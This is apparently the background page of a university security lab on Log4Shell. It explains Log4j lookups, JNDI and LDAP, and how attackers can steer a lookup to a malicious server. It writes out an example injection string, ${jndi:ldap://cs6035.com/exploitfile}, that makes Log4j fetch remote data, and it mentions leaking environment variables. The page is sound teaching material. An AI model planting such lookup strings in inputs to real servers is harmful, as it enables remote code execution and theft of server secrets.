---
layout: default
title: Project Log4Shell Background
nav_order: 2
#has_children: true
parent: Project Log4Shell Home
---
  
<div style="text-align:center">
  <span style="color: #003057; font-size:36px; font-weight: bold; text-decoration:underline">BACKGROUND</span>
</div>

Log4J is a very popular open-source framework that allows application developers to log important messages such as program flow, program state, exceptions, etc. These messages can include user input, dynamic data, database results, etc.

Java Naming and Directory Interface (JNDI) creates a way for Java Objects to be looked up at runtime. There are many directory interfaces that provide different ways to lookup files. A common example is a database connection pool so that applications deployed on a server can get the connections they need by only needing to know the JNDI name instead of having to have the connection details. You can use Java Serialization to store the byte array representation of an object to store objects in a directory/naming service. JNDI uses Naming References if the object is too large such as “ldap://server/location”

Where this comes into play in this exploit, is the Lightweight Directory Access Protocol (LDAP) which is not specific to Java. LDAP provides the communication language that is required to receive and send information from directory services. It can be used for authentication like sending usernames/passwords or retrieving object data through a url from another server.

To tie this into Log4J, Log4J performs [lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html) which allow for [string substitution](https://logging.apache.org/log4j/2.x/log4j-core/apidocs/org/apache/logging/log4j/core/lookup/StrSubstitutor.html) of certain strings. These are in the form of <span style="font-weight: bold">${prefix:name}</span> i.e. a common one would be <span style="font-weight: bold">${java:runtime}</span> and running this would produce “Running Java version 1.8.0_20”. Here is where the JNDI and LDAP come into play. <span style="font-weight: bold">${jndi:\<lookup\>}</span> is a valid lookup expression recognized by the lookup by Log4J. 

A malicious user could specify a valid lookup protocol such as LDAP, RMI, or DNS in the JNDI lookup and direct the Log4J lookup to their malicious server/file. An example could be <span style="font-weight: bold">${jndi:ldap://cs6035.com/exploitfile}</span> which would load data from that domain if a connection can be established. Attackers can even get environment variables if RCE is disabled and learn about the server/server environment. Often, HTTP requests log header information, query parameters, path parameters, and more which allow a vector for this attack to take place. With this background, now we are ready to start this lab.

Here is a visual of the Log4j exploit and how it is accomplished (you can zoom in if this is too small via ctrl + scroll):

![alt text](/images/Log4Shell.PNG)
